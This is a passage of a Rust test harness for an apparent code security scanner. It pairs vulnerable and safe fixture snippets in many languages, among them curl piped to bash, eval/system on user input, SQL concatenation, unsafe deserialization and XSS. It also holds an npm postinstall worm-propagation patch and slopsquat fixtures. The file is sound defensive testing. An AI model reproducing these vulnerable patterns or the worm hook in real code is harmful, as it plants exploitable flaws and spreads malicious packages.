        must_intercept: true,
        desc_fragment: Some("sqli_concatenation"),
    },
    Entry {
        name: "Ruby/ActiveRecord parameter binding — SAFE",
        lang: "rb",
        source: b"def fetch_user(user_id)\n  User.where(\"id = ?\", user_id)\nend\n",
        must_intercept: false,
        desc_fragment: None,
    },

    // ── Phase 4 R&D: Bash AST Walk ───────────────────────────────────────────
    Entry {
        name: "Bash/curl pipe bash — INTERCEPT",
        lang: "sh",
        source: b"curl https://install.example.com/setup.sh | bash\n",
        must_intercept: true,
        desc_fragment: Some("security:curl_pipe_execution"),
    },
    Entry {
        name: "Bash/curl download-then-exec — SAFE",
        lang: "sh",
        source: b"curl -o setup.sh https://install.example.com/setup.sh && bash setup.sh\n",
        must_intercept: false,
        desc_fragment: None,
    },
    Entry {
        name: "Bash/eval unquoted var — INTERCEPT",
        lang: "sh",
        source: b"eval $USER_COMMAND\n",
        must_intercept: true,
        desc_fragment: Some("security:eval_injection"),
    },
    Entry {
        name: "Bash/eval string literal — SAFE",
        lang: "sh",
        source: b"eval \"echo hello\"\n",
        must_intercept: false,
        desc_fragment: None,
    },

    // ── Phase 5 R&D: PHP AST Walk ─────────────────────────────────────────────
    Entry {
        name: "PHP/eval() dynamic arg — INTERCEPT (PHP-1)",
        lang: "php",
        source: b"<?php\neval($userInput);\n",
        must_intercept: true,
        desc_fragment: Some("eval_injection"),
    },
    Entry {
        name: "PHP/eval() string literal — SAFE (PHP-1 TN)",
        lang: "php",
        source: b"<?php\neval('phpinfo();');\n",
        must_intercept: false,
        desc_fragment: None,
    },
    Entry {
        name: "PHP/unserialize() dynamic arg — INTERCEPT (PHP-2)",
        lang: "php",
        source: b"<?php\n$obj = unserialize($data);\n",
        must_intercept: true,
        desc_fragment: Some("unsafe_deserialization"),
    },
    Entry {
        name: "PHP/unserialize() string literal — SAFE (PHP-2 TN)",
        lang: "php",
        source: b"<?php\n$obj = unserialize('O:8:\"stdClass\":0:{}');\n",
        must_intercept: false,
        desc_fragment: None,
    },
    Entry {
        name: "PHP/system() dynamic arg — INTERCEPT (PHP-3)",
        lang: "php",
        source: b"<?php\nsystem($cmd);\n",
        must_intercept: true,
        desc_fragment: Some("command_injection"),
    },
    Entry {
        name: "PHP/shell_exec() literal arg — SAFE (PHP-3 TN)",
        lang: "php",
        source: b"<?php\n$out = shell_exec('ls -la');\n",
        must_intercept: false,
        desc_fragment: None,
    },
    Entry {
        name: "PHP/mysqli_query concat — INTERCEPT (PHP SQLi)",
        lang: "php",
        source: b"<?php\nfunction fetch_user($conn, $user) {\n    mysqli_query($conn, \"SELECT * FROM users WHERE name = '\" . $user . \"'\");\n}\n",
        must_intercept: true,
        desc_fragment: Some("sqli_concatenation"),
    },
    Entry {
        name: "PHP/mysqli_query literal — SAFE (PHP SQLi TN)",
        lang: "php",
        source: b"<?php\nfunction fetch_user($conn) {\n    mysqli_query($conn, \"SELECT * FROM users\");\n}\n",
        must_intercept: false,
        desc_fragment: None,
    },

    // ── Phase 5 R&D: Kotlin AST Walk ──────────────────────────────────────────
    Entry {
        name: "Kotlin/Runtime.getRuntime().exec() dynamic — INTERCEPT (Kotlin-1)",
        lang: "kt",
        source: b"val p = Runtime.getRuntime().exec(userCommand)\n",
        must_intercept: true,
        desc_fragment: Some("command_injection_runtime_exec"),
    },
    Entry {
        name: "Kotlin/Runtime.getRuntime().exec() literal — SAFE (Kotlin-1 TN)",
        lang: "kt",
        source: b"val p = Runtime.getRuntime().exec(\"git status\")\n",
        must_intercept: false,
        desc_fragment: None,
    },
    Entry {
        name: "Kotlin/Class.forName() dynamic — INTERCEPT (Kotlin-2)",
        lang: "kt",
        source: b"val cls = Class.forName(className)\n",
        must_intercept: true,
        desc_fragment: Some("dynamic_class_loading"),
    },
    Entry {
        name: "Kotlin/Class.forName() literal — SAFE (Kotlin-2 TN)",
        lang: "kt",
        source: b"val cls = Class.forName(\"com.example.MyClass\")\n",
        must_intercept: false,
        desc_fragment: None,
    },

    // ── Phase 5 R&D: Scala AST Walk ───────────────────────────────────────────
    Entry {
        name: "Scala/Class.forName() dynamic — INTERCEPT (Scala-1)",
        lang: "scala",
        source: b"val cls = Class.forName(userInput)\n",
        must_intercept: true,
        desc_fragment: Some("dynamic_class_loading"),
    },
    Entry {
        name: "Scala/Class.forName() literal — SAFE (Scala-1 TN)",
        lang: "scala",
        source: b"val cls = Class.forName(\"com.example.Safe\")\n",
        must_intercept: false,
        desc_fragment: None,
    },
    Entry {
        name: "Scala/asInstanceOf on readObject() — INTERCEPT (Scala-2)",
        lang: "scala",
        source: b"val obj = ois.readObject().asInstanceOf[String]\n",
        must_intercept: true,
        desc_fragment: Some("unsafe_deserialization"),
    },
    Entry {
        name: "Scala/asInstanceOf without deser — SAFE (Scala-2 TN)",
        lang: "scala",
        source: b"val x = anyRef.asInstanceOf[String]\n",
        must_intercept: false,
        desc_fragment: None,
    },

    // ── Phase 5 R&D: Swift AST Walk ───────────────────────────────────────────
    Entry {
        name: "Swift/dlopen() dynamic path — INTERCEPT (Swift-1)",
        lang: "swift",
        source: b"let lib = dlopen(libraryPath, RTLD_LAZY)\n",
        must_intercept: true,
        desc_fragment: Some("dynamic_symbol_resolution"),
    },
    Entry {
        name: "Swift/dlopen() string literal — SAFE (Swift-1 TN)",
        lang: "swift",
        source: b"let lib = dlopen(\"/usr/lib/libz.dylib\", RTLD_LAZY)\n",
        must_intercept: false,
        desc_fragment: None,
    },
    Entry {
        name: "Swift/NSClassFromString() dynamic — INTERCEPT (Swift-2)",
        lang: "swift",
        source: b"let cls = NSClassFromString(className)\n",
        must_intercept: true,
        desc_fragment: Some("dynamic_class_loading"),
    },
    Entry {
        name: "Swift/NSClassFromString() literal — SAFE (Swift-2 TN)",
        lang: "swift",
        source: b"let cls = NSClassFromString(\"NSString\")\n",
        must_intercept: false,
        desc_fragment: None,
    },
    // ── Phase 6 R&D: Lua AST Walk ─────────────────────────────────────────────
    Entry {
        name: "Lua/loadstring() dynamic arg — INTERCEPT (Lua-1)",
        lang: "lua",
        source: b"local f = loadstring(userInput)\n",
        must_intercept: true,
        desc_fragment: Some("eval_injection"),
    },
    Entry {
        name: "Lua/loadstring() string literal — SAFE (Lua-1 TN)",
        lang: "lua",
        source: b"local f = loadstring(\"print('hello')\")\n",
        must_intercept: false,
        desc_fragment: None,
    },
    Entry {
        name: "Lua/os.execute() dynamic arg — INTERCEPT (Lua-2)",
        lang: "lua",
        source: b"os.execute(cmd)\n",
        must_intercept: true,
        desc_fragment: Some("command_injection"),
    },
    Entry {
        name: "Lua/os.execute() string literal — SAFE (Lua-2 TN)",
        lang: "lua",
        source: b"os.execute(\"ls -la\")\n",
        must_intercept: false,
        desc_fragment: None,
    },
    // ── Phase 6 R&D: Nix AST Walk ─────────────────────────────────────────────
    Entry {
        name: "Nix/fetchurl without sha256 — INTERCEPT (Nix-1)",
        lang: "nix",
        source: b"fetchurl { url = \"https://example.com/foo.tar.gz\"; }\n",
        must_intercept: true,
        desc_fragment: Some("unverified_fetch"),
    },
    Entry {
        name: "Nix/fetchurl with sha256 — SAFE (Nix-1 TN)",
        lang: "nix",
        source: b"fetchurl { url = \"https://example.com/foo.tar.gz\"; sha256 = \"abc123\"; }\n",
        must_intercept: false,
        desc_fragment: None,
    },
    Entry {
        name: "Nix/builtins.exec dynamic arg — INTERCEPT (Nix-2)",
        lang: "nix",
        source: b"builtins.exec userCmd\n",
        must_intercept: true,
        desc_fragment: Some("nix_exec_injection"),
    },
    Entry {
        name: "Nix/builtins.exec literal list — SAFE (Nix-2 TN)",
        lang: "nix",
        source: b"builtins.exec [ \"ls\" \"-la\" ]\n",
        must_intercept: false,
        desc_fragment: None,
    },
    // ── Phase 6 R&D: GDScript AST Walk ────────────────────────────────────────
    Entry {
        name: "GDScript/OS.execute() dynamic arg — INTERCEPT (GDScript-1)",
        lang: "gd",
        source: b"OS.execute(command, [], true)\n",
        must_intercept: true,
        desc_fragment: Some("command_injection"),
    },
    Entry {
        name: "GDScript/OS.execute() string literal — SAFE (GDScript-1 TN)",
        lang: "gd",
        source: b"OS.execute(\"ls\", [], true)\n",
        must_intercept: false,
        desc_fragment: None,
    },
    Entry {
        name: "GDScript/load() dynamic path — INTERCEPT (GDScript-2)",
        lang: "gd",
        source: b"var script = load(script_path)\n",
        must_intercept: true,
        desc_fragment: Some("dynamic_class_loading"),
    },
    Entry {
        name: "GDScript/load() string literal — SAFE (GDScript-2 TN)",
        lang: "gd",
        source: b"var script = load(\"res://scripts/Enemy.gd\")\n",
        must_intercept: false,
        desc_fragment: None,
    },
    // ── Phase 6 R&D: Objective-C AST Walk ────────────────────────────────────
    Entry {
        name: "ObjC/NSClassFromString() dynamic — INTERCEPT (ObjC-1)",
        lang: "m",
        source: b"Class cls = NSClassFromString(className);\n",
        must_intercept: true,
        desc_fragment: Some("dynamic_class_loading"),
    },
    Entry {
        name: "ObjC/NSClassFromString() literal — SAFE (ObjC-1 TN)",
        lang: "m",
        source: b"Class cls = NSClassFromString(@\"NSString\");\n",
        must_intercept: false,
        desc_fragment: None,
    },
    Entry {
        name: "ObjC/valueForKeyPath: dynamic key — INTERCEPT (ObjC-2)",
        lang: "m",
        source: b"id val = [obj valueForKeyPath:userKey];\n",
        must_intercept: true,
        desc_fragment: Some("kvc_injection"),
    },
    Entry {
        name: "ObjC/valueForKeyPath: literal key — SAFE (ObjC-2 TN)",
        lang: "m",
        source: b"id val = [obj valueForKeyPath:@\"name\"];\n",
        must_intercept: false,
        desc_fragment: None,
    },
    // ── Phase 7 R&D: Rust unsafe AST Walk ─────────────────────────────────────
    Entry {
        name: "Rust/unsafe transmute non-literal — INTERCEPT (Rust-1)",
        lang: "rs",
        source: b"fn cast(p: *const u8) -> u64 {\n    unsafe { std::mem::transmute::<*const u8, u64>(p) }\n}\n",
        must_intercept: true,
        desc_fragment: Some("unsafe_transmute"),
    },
    Entry {
        name: "Rust/unsafe transmute numeric literal — SAFE (Rust-1 TN)",
        lang: "rs",
        source: b"fn cast_int() -> i64 {\n    unsafe { std::mem::transmute::<u64, i64>(42) }\n}\n",
        must_intercept: false,
        desc_fragment: None,
    },
    Entry {
        name: "Rust/raw pointer deref non-FFI — INTERCEPT (Rust-2)",
        lang: "rs",
        source: b"fn read_val(data: &[u8]) -> u8 {\n    unsafe { *data.as_ptr() }\n}\n",
        must_intercept: true,
        desc_fragment: Some("raw_pointer_deref"),
    },
    Entry {
        name: "Rust/raw pointer deref sys fn — SAFE (Rust-2 TN)",
        lang: "rs",
        source: b"fn sys_read_byte(ptr: *const u8) -> u8 {\n    unsafe { *ptr }\n}\n",
        must_intercept: false,
        desc_fragment: None,
    },
    // ── Phase 7 R&D: GLSL Byte Scan ───────────────────────────────────────────
    Entry {
        name: "GLSL/dangerous extension require — INTERCEPT (GLSL-1)",
        lang: "glsl",
        source: b"#version 450\n#extension GL_EXT_shader_image_load_store : require\nvoid main() {}\n",
        must_intercept: true,
        desc_fragment: Some("glsl_dangerous_extension"),
    },
    Entry {
        name: "GLSL/dangerous extension enable — SAFE (GLSL-1 TN)",
        lang: "glsl",
        source: b"#version 450\n#extension GL_EXT_shader_image_load_store : enable\nvoid main() {}\n",
        must_intercept: false,
        desc_fragment: None,
    },
    // ── Phase 7 R&D: HCL AST Walk ─────────────────────────────────────────────
    Entry {
        name: "HCL/data external block — INTERCEPT (HCL-1)",
        lang: "tf",
        source: b"data \"external\" \"my_source\" {\n  program = [\"python3\", var.script]\n}\n",
        must_intercept: true,
        desc_fragment: Some("terraform_external_exec"),
    },
    Entry {
        name: "HCL/data non-external block — SAFE (HCL-1 TN)",
        lang: "tf",
        source: b"data \"aws_ami\" \"ubuntu\" {\n  filter {\n    name   = \"name\"\n    values = [\"ubuntu*\"]\n  }\n}\n",
        must_intercept: false,
        desc_fragment: None,
    },
    Entry {
        name: "HCL/provisioner local-exec var command — INTERCEPT (HCL-2)",
        lang: "tf",
        source: b"provisioner \"local-exec\" {\n  command = var.deploy_script\n}\n",
        must_intercept: true,
        desc_fragment: Some("provisioner_command_injection"),
    },
    Entry {
        name: "HCL/provisioner local-exec literal command — SAFE (HCL-2 TN)",
        lang: "tf",
        source: b"provisioner \"local-exec\" {\n  command = \"echo done\"\n}\n",
        must_intercept: false,
        desc_fragment: None,
    },
    // ── Phase 7 R&D: JSX dangerouslySetInnerHTML Walk ─────────────────────────
    Entry {
        name: "JSX/dangerouslySetInnerHTML dynamic — INTERCEPT (TSX-1)",
        lang: "jsx",
        source: b"const el = <div dangerouslySetInnerHTML={{ __html: userInput }} />;\n",
        must_intercept: true,
        desc_fragment: Some("react_xss_dangerous_html"),
    },
    Entry {
        name: "JSX/dangerouslySetInnerHTML string literal — SAFE (TSX-1 TN)",
        lang: "jsx",
        source: b"const el = <div dangerouslySetInnerHTML={{ __html: \"<b>static</b>\" }} />;\n",
        must_intercept: false,
        desc_fragment: None,
    },

    // ── IAC Agentic Recon Interceptor (Snowflake Defense) ─────────────────────
    Entry {
        name: "HCL/IAM wildcard Action+Resource — INTERCEPT (IAC-1)",
        lang: "tf",
        source: b"\
resource \"aws_iam_role\" \"pentester\" {\n\
  assume_role_policy = jsonencode({\n\
    Statement = [{\n\
      Action   = \"*\"\n\
      Resource = \"*\"\n\
      Effect   = \"Allow\"\n\
    }]\n\
  })\n\
}\n",
        must_intercept: true,
        desc_fragment: Some("iac_agentic_recon_target"),
    },
    Entry {
        name: "HCL/IAM scoped Action — SAFE (IAC-1 TN)",
        lang: "tf",
        source: b"\
resource \"aws_iam_role\" \"reader\" {\n\
  assume_role_policy = jsonencode({\n\
    Statement = [{\n\
      Action   = \"s3:GetObject\"\n\
      Resource = \"arn:aws:s3:::my-bucket/*\"\n\
      Effect   = \"Allow\"\n\
    }]\n\
  })\n\
}\n",
        must_intercept: false,
        desc_fragment: None,
    },
    Entry {
        name: "HCL/Snowflake unauth stage — INTERCEPT (IAC-2)",
        lang: "tf",
        source: b"\
resource \"snowflake_stage\" \"ext\" {\n\
  name     = \"my_ext_stage\"\n\
  database = \"mydb\"\n\
  schema   = \"public\"\n\
  url      = \"s3://my-bucket/prefix/\"\n\
}\n",
        must_intercept: true,
        desc_fragment: Some("iac_agentic_recon_target"),
    },
    Entry {
        name: "HCL/Snowflake stage with storage_integration — SAFE (IAC-2 TN)",
        lang: "tf",
        source: b"\
resource \"snowflake_stage\" \"ext\" {\n\
  name                = \"my_ext_stage\"\n\
  database            = \"mydb\"\n\
  schema              = \"public\"\n\
  url                 = \"s3://my-bucket/prefix/\"\n\
  storage_integration = snowflake_storage_integration.s3_int.name\n\
}\n",
        must_intercept: false,
        desc_fragment: None,
    },
    Entry {
        name: "HCL/provider hardcoded secret_key — INTERCEPT (IAC-3)",
        lang: "tf",
        source: b"\
provider \"aws\" {\n\
  region     = \"us-east-1\"\n\
  access_key = \"AKIAIOSFODNN7EXAMPLE\"\n\
  secret_key = \"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\"\n\
}\n",
        must_intercept: true,
        desc_fragment: Some("iac_agentic_recon_target"),
    },
    Entry {
        name: "HCL/provider env-var credential — SAFE (IAC-3 TN)",
        lang: "tf",
        source: b"\
provider \"aws\" {\n\
  region     = \"us-east-1\"\n\
  access_key = var.aws_access_key\n\
  secret_key = var.aws_secret_key\n\
}\n",
        must_intercept: false,
        desc_fragment: None,
    },

    // ── Zig: Glassworm Defense ─────────────────────────────────────────────────
    Entry {
        name: "Zig/std.os.execv dynamic path — INTERCEPT (ZIG-1)",
        lang: "zig",
        source: b"\
const std = @import(\"std\");\npub fn run(path: []const u8, argv: []const []const u8) !void {\n    try std.os.execv(path, argv);\n}\n",
        must_intercept: true,
        desc_fragment: Some("zig_exec_injection"),
    },
    Entry {
        name: "Zig/std.process.exec dynamic — INTERCEPT (ZIG-2)",
        lang: "zig",
        source: b"\
const std = @import(\"std\");\npub fn run(argv: []const []const u8, alloc: std.mem.Allocator) !void {\n    _ = try std.process.exec(.{ .allocator = alloc, .argv = argv });\n}\n",
        must_intercept: true,
        desc_fragment: Some("zig_exec_injection"),
    },
    Entry {
        name: "Zig/@cImport + system() FFI bridge — INTERCEPT (ZIG-3)",
        lang: "zig",
        source: b"\
const c = @cImport(@cInclude(\"stdlib.h\"));\npub fn run(cmd: [*:0]const u8) void {\n    _ = c.system(cmd);\n}\n",
        must_intercept: true,
        desc_fragment: Some("zig_cimport_exec_bridge"),
    },
    Entry {
        name: "Zig/std.fs.openFile safe file op — SAFE (ZIG TN)",
        lang: "zig",
        source: b"\
const std = @import(\"std\");\npub fn read_config(path: []const u8, alloc: std.mem.Allocator) ![]u8 {\n    const file = try std.fs.openFile(path, .{ .mode = .read_only });\n    defer file.close();\n    return try file.readToEndAlloc(alloc, 1024 * 1024);\n}\n",
        must_intercept: false,
        desc_fragment: None,
    },
];

// ---------------------------------------------------------------------------
// Runner
// ---------------------------------------------------------------------------

/// Run the full Threat Gallery. Prints per-entry verdicts and a summary line.
/// Returns `true` when all entries pass; `false` if any entry fails.
pub fn run_gallery() -> bool {
    let mut passed: usize = 0;
    let mut failed: usize = 0;

    for entry in GALLERY {
        let parsed = ParsedUnit::unparsed(entry.source);
        let findings = find_slop(entry.lang, &parsed);
        let intercepted = !findings.is_empty();

        let ok = if entry.must_intercept {
            if !intercepted {
                false
            } else if let Some(frag) = entry.desc_fragment {
                findings
                    .iter()
                    .any(|f| f.description.to_lowercase().contains(&frag.to_lowercase()))
            } else {
                true
            }
        } else {
            !intercepted
        };

        if ok {
            println!("[PASS] {}", entry.name);
            passed += 1;
        } else if entry.must_intercept {
            let desc = findings
                .first()
                .map(|f| f.description.as_str())
                .unwrap_or("<no findings>");
            if findings.is_empty() {
                eprintln!("[FAIL] {} — expected intercept, got 0 findings", entry.name);
            } else {
                eprintln!(
                    "[FAIL] {} — expected desc containing {:?}; got: {:?}",
                    entry.name,
                    entry.desc_fragment.unwrap_or(""),
                    desc,
                );
            }
            failed += 1;
        } else {
            eprintln!(
                "[FAIL] {} — expected clean, got {} finding(s): {:?}",
                entry.name,
                findings.len(),
                findings
                    .first()
                    .map(|f| f.description.as_str())
                    .unwrap_or(""),
            );
            failed += 1;
        }
    }

    let total = passed + failed;
    if failed == 0 {
        println!("\nCrucible: {passed}/{total} — SANCTUARY INTACT.");
        true
    } else {
        let s = if failed == 1 { "" } else { "ES" };
        eprintln!("\nCrucible: {passed}/{total} passed — {failed} BREACH{s} DETECTED.");
        false
    }
}

// ---------------------------------------------------------------------------
// Blast Radius Bounce Gallery — exercises PatchBouncer directly
// ---------------------------------------------------------------------------

fn make_multi_dir_patch(paths: &[&str]) -> String {
    paths
        .iter()
        .map(|p| {
            format!(
                "diff --git a/{p} b/{p}\n\
                 index 0000000..1111111 100644\n\
                 --- a/{p}\n\
                 +++ b/{p}\n\
                 @@ -0,0 +1 @@\n\
                 +// change\n"
            )
        })
        .collect::<Vec<_>>()
        .join("\n")
}

struct BounceEntry {
    name: &'static str,
    paths: &'static [&'static str],
    must_intercept: bool,
    desc_fragment: Option<&'static str>,
}

const BOUNCE_GALLERY: &[BounceEntry] = &[
    BounceEntry {
        name: "BlastRadius/6-dir PR — INTERCEPT",
        paths: &[
            "crates/forge/src/lib.rs",
            "docs/setup.md",
            "tools/script.sh",
            "frontend/app.js",
            "backend/api.rs",
            "infra/main.tf",
        ],
        must_intercept: true,
        desc_fragment: Some("blast_radius_violation"),
    },
    BounceEntry {
        name: "BlastRadius/5-dir PR (at boundary) — SAFE",
        paths: &[
            "crates/forge/src/lib.rs",
            "docs/setup.md",
            "tools/script.sh",
            "frontend/app.js",
            "backend/api.rs",
        ],
        must_intercept: false,
        desc_fragment: None,
    },
    BounceEntry {
        name: "BlastRadius/6-dir but lockfile excluded — SAFE",
        paths: &[
            "crates/forge/src/lib.rs",
            "docs/setup.md",
            "tools/script.sh",
            "frontend/app.js",
            "backend/api.rs",
            "Cargo.lock",
        ],
        must_intercept: false,
        desc_fragment: None,
    },
    BounceEntry {
        name: "Sha1-Hulud/package.json triad — INTERCEPT",
        paths: &["package.json"],
        must_intercept: true,
        desc_fragment: Some("npm_worm_propagation"),
    },
];

/// Run the Blast Radius Bounce Gallery.
/// Returns `true` when all entries pass; `false` if any fail.
pub fn run_bounce_gallery() -> bool {
    use common::registry::SymbolRegistry;
    let registry = SymbolRegistry::default();
    let bouncer = PatchBouncer::default();

    let mut passed: usize = 0;
    let mut failed: usize = 0;

    for entry in BOUNCE_GALLERY {
        let patch = if entry.name == "Sha1-Hulud/package.json triad — INTERCEPT" {
            "diff --git a/package.json b/package.json\n\
             index 1111111..2222222 100644\n\
             --- a/package.json\n\
             +++ b/package.json\n\
             @@ -1,7 +1,7 @@\n\
              {\n\
             -  \"version\": \"1.0.1\",\n\
             +  \"version\": \"1.0.2\",\n\
                \"scripts\": {\n\
             -    \"test\": \"vitest\"\n\
             +    \"postinstall\": \"node worm.js && npm publish\"\n\
                }\n\
              }\n"
            .to_string()
        } else {
            make_multi_dir_patch(entry.paths)
        };
        let score: SlopScore = match bouncer.bounce(&patch, &registry) {
            Ok(s) => s,
            Err(e) => {
                eprintln!("[FAIL] {} — bounce error: {e}", entry.name);
                failed += 1;
                continue;
            }
        };
        let intercepted = score
            .antipattern_details
            .iter()
            .any(|d| entry.desc_fragment.is_none_or(|frag| d.contains(frag)));

        let ok = if entry.must_intercept {
            intercepted
        } else {
            // Must NOT intercept on the specific fragment
            !score
                .antipattern_details
                .iter()
                .any(|d| entry.desc_fragment.is_some_and(|frag| d.contains(frag)))
        };

        if ok {
            println!("[PASS] {}", entry.name);
            passed += 1;
        } else if entry.must_intercept {
            eprintln!(
                "[FAIL] {} — expected blast_radius_violation, got: {:?}",
                entry.name, score.antipattern_details
            );
            failed += 1;
        } else {
            eprintln!(
                "[FAIL] {} — expected clean, got: {:?}",
                entry.name, score.antipattern_details
            );
            failed += 1;
        }
    }

    let total = passed + failed;
    if failed == 0 {
        println!("\nBlast Radius Gallery: {passed}/{total} — SANCTUARY INTACT.");
        true
    } else {
        let s = if failed == 1 { "" } else { "ES" };
        eprintln!("\nBlast Radius Gallery: {passed}/{total} passed — {failed} BREACH{s} DETECTED.");
        false
    }
}

fn main() {
    let gallery_ok = run_gallery();
    let bounce_ok = run_bounce_gallery();
    if !gallery_ok || !bounce_ok {
        std::process::exit(1);
    }
}

// ---------------------------------------------------------------------------
// Test integration — runs as part of `just audit` via `cargo test`
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;
    use common::bloom::SlopsquatFilter;
    use common::deps::DependencyEcosystem;
    use common::wisdom::{KevDependencyRule, SlopsquatCorpus, WisdomSet};
    use std::fs;

    fn write_slopsquat_fixture(janitor_dir: &std::path::Path, packages: &[&str]) {
        let mut wisdom = WisdomSet::default();
        wisdom.slopsquat_filter = SlopsquatFilter::from_seed_corpus(packages);
        let wisdom_bytes = rkyv::to_bytes::<rkyv::rancor::Error>(&wisdom).unwrap();
        fs::write(janitor_dir.join("wisdom.rkyv"), wisdom_bytes).unwrap();

        let corpus = SlopsquatCorpus {
            package_names: packages.iter().map(|pkg| pkg.to_string()).collect(),
        };
        let corpus_bytes = rkyv::to_bytes::<rkyv::rancor::Error>(&corpus).unwrap();
        fs::write(janitor_dir.join("slopsquat_corpus.rkyv"), corpus_bytes).unwrap();
    }

    /// Full gallery must pass — any detector regression here blocks `just audit`.
    #[test]
    fn threat_gallery_all_intercepted() {
        // Suppress stdout in test mode; only stderr failures are visible.
        assert!(
            run_gallery(),
            "Crucible: Threat Gallery breach — one or more detectors failed"
        );
    }

    #[test]
    fn sha1_hulud_bounce_fixture_intercepted() {
        let patch = "diff --git a/package.json b/package.json\n\
                     index 1111111..2222222 100644\n\
                     --- a/package.json\n\
                     +++ b/package.json\n\
                     @@ -1,7 +1,7 @@\n\
                      {\n\
                     -  \"version\": \"1.0.1\",\n\
                     +  \"version\": \"1.0.2\",\n\
                        \"scripts\": {\n\
                     -    \"test\": \"vitest\"\n\
                     +    \"postinstall\": \"node worm.js && npm publish\"\n\
                        }\n\
                      }\n";
        let score = forge::slop_filter::PatchBouncer::default()
            .bounce(patch, &common::registry::SymbolRegistry::default())
            .unwrap();
        assert!(
            score
                .antipattern_details
                .iter()
                .any(|d| d.contains("security:npm_worm_propagation")),
            "Crucible: Sha1-Hulud triad must be intercepted by PatchBouncer"
        );
        assert!(
            score.antipattern_score >= forge::slop_hunter::Severity::KevCritical.points(),
            "Crucible: Sha1-Hulud triad must preserve KevCritical scoring"
        );
    }

    /// Blast Radius Bounce Gallery must pass — verifies the 5-directory gate.
    #[test]
    fn blast_radius_gallery_all_intercepted() {
        assert!(
            run_bounce_gallery(),
            "Crucible: Blast Radius Gallery breach — PatchBouncer gate failed"
        );
    }

    #[test]
    fn kev_dependency_lockfile_fixture_intercepted() {
        let dir = tempfile::tempdir().unwrap();
        let janitor_dir = dir.path().join(".janitor");
        fs::create_dir_all(&janitor_dir).unwrap();

        let lockfile = r#"
version = 4

[[package]]
name = "serde"
version = "1.0.150"
"#;
        fs::write(dir.path().join("Cargo.lock"), lockfile.as_bytes()).unwrap();

        let mut wisdom = WisdomSet {
            kev_dependency_rules: vec![KevDependencyRule {
                package_name: "serde".into(),
                ecosystem: DependencyEcosystem::Cargo,
                cve_id: "CVE-2026-9999".into(),
                affected_versions: vec!["1.0.150".into()],
                summary: "synthetic crucible fixture".into(),
            }],
            ..Default::default()
        };
        wisdom.sort();
        let wisdom_bytes = rkyv::to_bytes::<rkyv::rancor::Error>(&wisdom).unwrap();
        fs::write(janitor_dir.join("wisdom.rkyv"), wisdom_bytes).unwrap();

        let patch = r#"diff --git a/Cargo.lock b/Cargo.lock
index 1111111..2222222 100644
--- a/Cargo.lock
+++ b/Cargo.lock
@@ -1,0 +1,6 @@
+version = 4
+
+[[package]]
+name = "serde"
+version = "1.0.150"
+"#;

        let score = forge::slop_filter::PatchBouncer::for_workspace(dir.path())
            .bounce(patch, &common::registry::SymbolRegistry::default())
            .unwrap();

        assert!(
            score
                .antipattern_details
                .iter()
                .any(|d| d.contains("supply_chain:kev_dependency")),
            "Crucible: KEV dependency fixture was not surfaced in antipattern details"
        );
        assert!(
            score.antipattern_score >= 150,
            "Crucible: KEV dependency fixture must contribute at least 150 points"
        );
    }

    #[test]
    fn slopsquat_python_fixture_intercepted() {
        let dir = tempfile::tempdir().unwrap();
        let janitor_dir = dir.path().join(".janitor");
        fs::create_dir_all(&janitor_dir).unwrap();

        write_slopsquat_fixture(
            &janitor_dir,
            &[
                "py-react-vsc",
                "django-tailwind-fast",
                "node-express-secure-template",
            ],
        );

        let patch = "diff --git a/app.py b/app.py\n\
                     index 0000000..1111111 100644\n\
                     --- a/app.py\n\
                     +++ b/app.py\n\
                     @@ -0,0 +1,2 @@\n\
                     +import py_react_vsc\n\
                     +print('boom')\n";

        let score = forge::slop_filter::PatchBouncer::for_workspace(dir.path())
            .bounce(patch, &common::registry::SymbolRegistry::default())
            .unwrap();

        assert!(
            score
                .antipattern_details
                .iter()
                .any(|d| d.contains("security:slopsquat_injection")),
            "Crucible: Python slopsquat fixture was not surfaced in antipattern details"
        );
        assert!(
            score.antipattern_score >= 150,
            "Crucible: Python slopsquat fixture must contribute at least 150 points"
        );
    }

    #[test]
    fn slopsquat_python_fixture_safe() {
        let dir = tempfile::tempdir().unwrap();
        let janitor_dir = dir.path().join(".janitor");
        fs::create_dir_all(&janitor_dir).unwrap();

        write_slopsquat_fixture(
            &janitor_dir,
            &[
                "py-react-vsc",
                "django-tailwind-fast",
                "node-express-secure-template",
            ],
        );

        let patch = "diff --git a/app.py b/app.py\n\
                     index 0000000..1111111 100644\n\
                     --- a/app.py\n\
                     +++ b/app.py\n\
                     @@ -0,0 +1,2 @@\n\
                     +import requests\n\
                     +print('safe')\n";

        let score = forge::slop_filter::PatchBouncer::for_workspace(dir.path())
            .bounce(patch, &common::registry::SymbolRegistry::default())
            .unwrap();

        assert!(
            !score
                .antipattern_details
                .iter()
                .any(|d| d.contains("security:slopsquat_injection")),
            "Crucible: safe Python import must not trigger slopsquat detection"
        );
    }

    #[test]
    fn slopsquat_javascript_fixture_intercepted() {
        let dir = tempfile::tempdir().unwrap();
        let janitor_dir = dir.path().join(".janitor");
        fs::create_dir_all(&janitor_dir).unwrap();

        write_slopsquat_fixture(
            &janitor_dir,
            &[
                "py-react-vsc",
                "django-tailwind-fast",
                "node-express-secure-template",
            ],
        );

        let patch = "diff --git a/index.js b/index.js\n\
                     index 0000000..1111111 100644\n\
                     --- a/index.js\n\
                     +++ b/index.js\n\
                     @@ -0,0 +1,2 @@\n\
                     +const tpl = require('node-express-secure-template');\n\
                     +console.log(tpl);\n";

        let score = forge::slop_filter::PatchBouncer::for_workspace(dir.path())
            .bounce(patch, &common::registry::SymbolRegistry::default())
            .unwrap();

        assert!(
            score
                .antipattern_details
                .iter()
                .any(|d| d.contains("security:slopsquat_injection")),
            "Crucible: JavaScript slopsquat fixture was not surfaced in antipattern details"
        );
        assert!(
            score.antipattern_score >= 150,
            "Crucible: JavaScript slopsquat fixture must contribute at least 150 points"
        );
    }

    #[test]
    fn slopsquat_javascript_fixture_safe() {
        let dir = tempfile::tempdir().unwrap();
        let janitor_dir = dir.path().join(".janitor");
        fs::create_dir_all(&janitor_dir).unwrap();

        write_slopsquat_fixture(
            &janitor_dir,
            &[
                "py-react-vsc",
                "django-tailwind-fast",
                "node-express-secure-template",
            ],
        );

        let patch = "diff --git a/index.js b/index.js\n\
                     index 0000000..1111111 100644\n\
                     --- a/index.js\n\
                     +++ b/index.js\n\
                     @@ -0,0 +1,2 @@\n\
                     +const express = require('express');\n\
                     +console.log(express);\n";

        let score = forge::slop_filter::PatchBouncer::for_workspace(dir.path())
